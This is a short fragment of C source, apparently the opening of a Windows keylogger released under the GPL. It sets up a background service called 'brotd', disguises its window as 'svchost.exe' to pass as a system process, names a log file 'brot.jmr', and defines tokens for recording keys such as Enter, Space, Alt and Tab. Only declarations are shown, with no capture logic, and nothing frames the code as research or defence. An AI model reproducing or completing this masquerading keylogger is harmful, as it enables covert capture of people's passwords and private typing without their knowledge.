/*
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define WIN32_LEAN_AND_MEAN

// _M4rc!
#ifdef WIN32
char serviceName[] = "brotd";
char serviceLongName[] = "Brot service";
char serviceDescription[] = "Brot Demon";
/*
 * -1 - not in service mode
 *  0 - stopped
 *  1 - running
 *  2 - paused
 */
int m_ServiceStatus = -1;
#endif

#define MAX_BUF_SIZE 256
#define CLASSNAME "svchost.exe"
#define WINDOWNAME "svchost"
#define OUPTUT_FILE "brot.jmr"

#define NEWLINE "ENT"
#define SPACE "SPC"
#define ALT "ALT"
#define TAB "TAB"


#define snprintf _snprintf


/*
 * Global variables
 *
 */

bool gPreviousWasASpecialChar = true;
